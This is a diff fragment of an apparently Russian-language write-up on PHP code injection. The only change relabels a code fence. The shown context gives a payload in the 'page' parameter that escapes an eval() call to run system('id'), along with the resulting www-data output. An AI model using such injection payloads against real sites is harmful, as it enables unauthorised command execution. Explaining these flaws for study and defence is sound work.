@@ -116,7 +116,7 @@ assert($debug); // В PHP < 7.2 исполняет код
 **Реальная эксплуатация:**
 
 1. **Простое выполнение команд:**
-```http
+```bash
 ?page=home');system('id');//
 Выполнится: eval("$content = get_page_content('home');system('id');//');");
 Результат: uid=33(www-data) gid=33(www-data)
